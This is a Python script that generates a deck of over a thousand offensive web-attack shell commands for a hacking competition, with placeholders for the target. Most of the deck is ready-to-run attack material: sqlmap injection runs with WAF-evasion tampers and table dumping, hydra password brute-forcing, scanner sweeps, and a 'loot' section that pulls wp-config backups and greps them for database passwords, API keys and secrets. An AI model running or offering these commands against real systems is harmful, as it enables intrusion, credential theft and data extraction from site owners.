#!/usr/bin/env python3
"""Generate competition CLI command deck with $TARGET / $DOMAIN placeholders."""
from __future__ import annotations

import itertools
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "docs" / "generated" / "competition_commands_1000.txt"

HEADER = """# BountyTools competition command deck (generated)
# Use only on hosts your competition or program authorizes.
# Replace $TARGET (full URL) and $DOMAIN (hostname only).
# Regenerate: python3 scripts/generate_competition_commands.py
"""

TAMPERS = [
    "space2comment", "between", "randomcase", "charencode", "equaltolike",
    "percentage", "charunicodeencode", "versionedkeywords", "bluecoat",
]
PARAMS = ["id", "uid", "pid", "user", "user_id", "product_id", "order_id", "page", "cat", "q", "query", "search", "sort", "filter", "ref", "file", "path", "url", "redirect"]
NUCLEI_TAGS = [
    "cve", "exposure", "misconfig", "tech", "wordpress", "wp", "sqli", "xss", "ssrf", "lfi", "rfi",
    "takeover", "default-login", "token", "api", "graphql", "debug", "backup", "config",
]
FFUF_MC = ["200", "204", "301", "302", "307", "401", "403", "500", "405"]
GREPS = [
    r"wp-config", r"\.sql", r"phpmyadmin", r"adminer", r"\.env", r"debug\.log", r"\.git",
    r"graphql", r"swagger", r"openapi", r"backup", r"dump", r"api/", r"token", r"oauth",
    r"id=", r"order=", r"user=", r"upload", r"\.bak", r"config\.php",
]
PATHS = ["/admin", "/api", "/api/v1", "/graphql", "/swagger", "/wp-admin", "/wp-login.php", "/.git/config", "/robots.txt"]
KATANA_DEPTH = [1, 2, 3]
SQL_LEVEL = [1, 2, 3, 4, 5]
SQL_RISK = [1, 2, 3]


def emit(lines: list[str]) -> None:
    base = [
        f'export TARGET="https://$DOMAIN"',
        f'export DOMAIN="competition.example"',
        f'mkdir -p "$HOME/ops/$DOMAIN"/{{recon,urls,live,fuzz,inj,ssl,evidence,loot}}',
        f'subfinder -d "$DOMAIN" -all -o "$HOME/ops/$DOMAIN/recon/subs.txt"',
        f'gau "$DOMAIN" | sort -u > "$HOME/ops/$DOMAIN/urls/gau.txt"',
        f'katana -u "$TARGET" -d 2 -jc -o "$HOME/ops/$DOMAIN/urls/katana.txt"',
        f'httpx -u "$TARGET" -status-code -title -tech-detect',
        f'naabu -host "$DOMAIN" -top-ports 1000 -o "$HOME/ops/$DOMAIN/recon/ports.txt"',
        f'nmap -sV -p 80,443,8080,8443 "$DOMAIN" -oA "$HOME/ops/$DOMAIN/recon/nmap_web"',
        f'dirb "$TARGET" /usr/share/wordlists/dirb/common.txt',
        f'feroxbuster -u "$TARGET" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -C 404',
        f'wpscan --url "$TARGET" --enumerate u,vp,vt,p',
        f'nuclei -u "$TARGET" -severity high,critical -o "$HOME/ops/$DOMAIN/evidence/nuclei.txt"',
        f'sqlmap -u "$TARGET/page?id=1" --batch --smart -p id',
        f'commix -u "$TARGET" --batch --level=2',
        f'sstimap -u "$TARGET"',
        f'python3 xsstrike.py -u "$TARGET?q=1" --fuzzer',
        f'sslscan "$DOMAIN"',
        f'sslyze "$DOMAIN" --regular',
        f'searchsploit apache wordpress nginx',
    ]
    lines.extend(base)

    # katana depth combinations
    for d in KATANA_DEPTH:
        for flag in ("jc", "jsl", "jc,jsl"):
            lines.append(f'katana -u "$TARGET" -d {d} -{flag} -o "$HOME/ops/$DOMAIN/urls/katana_d{d}_{flag.replace(",","_")}.txt"')

    # sqlmap tamper x level x risk x param URL
    for tamper, lvl, risk, param in itertools.islice(
        itertools.product(TAMPERS, SQL_LEVEL, SQL_RISK, PARAMS), 400
    ):
        lines.append(
            f'sqlmap -u "$TARGET/page?{param}=1" -p {param} --batch --level={lvl} --risk={risk} '
            f'--tamper={tamper} --random-agent --threads=2'
        )

    # nuclei tag pairs
    for t1, t2 in itertools.islice(itertools.combinations(NUCLEI_TAGS, 2), 120):
        lines.append(
            f'nuclei -u "$TARGET" -tags {t1},{t2} -o "$HOME/ops/$DOMAIN/evidence/nuclei_{t1}_{t2}.txt"'
        )

    # ffuf mc combos
    for mc in FFUF_MC:
        for path in PATHS:
            lines.append(
                f'ffuf -u "$TARGET{path}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc {mc} -o "$HOME/ops/$DOMAIN/fuzz/ffuf_{path.strip("/").replace("/","_")}_{mc}.json"'
            )

    # gau + grep patterns
    for pat in GREPS:
        safe = pat.replace("\\", "").replace(".", "dot")
        lines.append(f'gau "$DOMAIN" | grep -Ei "{pat}" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_{safe}.txt"')
        lines.append(f'cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "{pat}" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_{safe}.txt"')

    # hydra / medusa limited
    for svc in ("http-get", "http-post-form", "https-form-post"):
        lines.append(
            f'hydra -L users.txt -P pass.txt "$DOMAIN" {svc} "/login:user=^USER^&pass=^PASS^:F=fail" -t 4 -o "$HOME/ops/$DOMAIN/fuzz/hydra_{svc.replace("-","_")}.txt"'
        )

    # EXTRACTION / evidence harvest (authorized)
    extraction = [
        'curl -sS "$TARGET" -o "$HOME/ops/$DOMAIN/loot/index.html"',
        'curl -sS "$TARGET/wp-config.php.bak" -o "$HOME/ops/$DOMAIN/loot/wp-config.php.bak"',
        'wget -q "$TARGET/readme.html" -O "$HOME/ops/$DOMAIN/loot/readme.html"',
        'httpx -l "$HOME/ops/$DOMAIN/urls/high_value.txt" -json -o "$HOME/ops/$DOMAIN/loot/httpx.json"',
        'nuclei -u "$TARGET" -json -o "$HOME/ops/$DOMAIN/loot/nuclei.json"',
        'sqlmap -u "$TARGET/page?id=1" -p id --batch --banner --current-user --current-db 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_meta.txt"',
        'grep -RinE "DB_NAME|DB_USER|DB_PASSWORD|API_KEY|SECRET" "$HOME/ops/$DOMAIN/loot/" | tee "$HOME/ops/$DOMAIN/loot/grep_secrets.txt"',
        'tar -czf "$HOME/ops/$DOMAIN/evidence/loot_$(date +%F).tar.gz" -C "$HOME/ops/$DOMAIN" loot evidence',
        'while read -r u; do f=$(echo "$u" | md5sum | cut -c1-12); curl -sS "$u" -o "$HOME/ops/$DOMAIN/loot/$f.body"; done < "$HOME/ops/$DOMAIN/live/fetch_these.txt"',
        'jq -r ".url + \" \" + (.status_code|tostring)" "$HOME/ops/$DOMAIN/loot/httpx.json" | tee "$HOME/ops/$DOMAIN/loot/httpx_flat.txt"',
    ]
    for i, ex in enumerate(extraction):
        lines.append(ex)
    for pat in PARAMS[:15]:
        lines.append(
            f'sqlmap -u "$TARGET/item?{pat}=1" -p {pat} --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_{pat}_tables.txt"'
        )

    # subfinder resolvers / dnsx
    for src in ("crtsh", "hackertarget", "waybackarchive"):
        lines.append(f'subfinder -d "$DOMAIN" -s {src} -o "$HOME/ops/$DOMAIN/recon/subs_{src}.txt"')

    # msf aux only
    for mod in ("http_version", "http_title", "dir_scanner", "robots_txt", "backup_file", "http_put"):
        lines.append(
            f'msfconsole -q -x "use auxiliary/scanner/http/{mod}; set RHOSTS $DOMAIN; set RPORT 443; set SSL true; run; exit"'
        )

    # pad to 1000+ unique with arjun/dalfox param variants
    while len(lines) < 1050:
        i = len(lines)
        p = PARAMS[i % len(PARAMS)]
        lines.append(f'arjun -u "$TARGET/page{i}" --include "{p}=test" -oT "$HOME/ops/$DOMAIN/fuzz/arjun_{p}_{i}.json"')
        lines.append(f'dalfox url "$TARGET/search?{p}=XSSCANARY" --silence -o "$HOME/ops/$DOMAIN/inj/dalfox_{p}_{i}.txt"')
        lines.append(f'grep -Ei "{p}=" "$HOME/ops/$DOMAIN/urls/gau.txt" | head -5 > "$HOME/ops/$DOMAIN/urls/grep_{p}_{i}.txt"')

    # dedupe preserving order
    seen: set[str] = set()
    unique: list[str] = []
    for line in lines:
        if line not in seen:
            seen.add(line)
            unique.append(line)

    inspect_cmds = ROOT / "docs" / "generated" / "inspect_critical_commands.sh"
    if inspect_cmds.is_file():
        body = inspect_cmds.read_text(encoding="utf-8")
        for line in body.splitlines():
            line = line.strip()
            if line and not line.startswith("#") and line not in seen:
                seen.add(line)
                unique.append(line)

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(HEADER + "\n".join(unique) + f"\n# total_commands: {len(unique)}\n", encoding="utf-8")
    print(f"wrote {len(unique)} commands -> {OUT}")


if __name__ == "__main__":
    buf: list[str] = []
    emit(buf)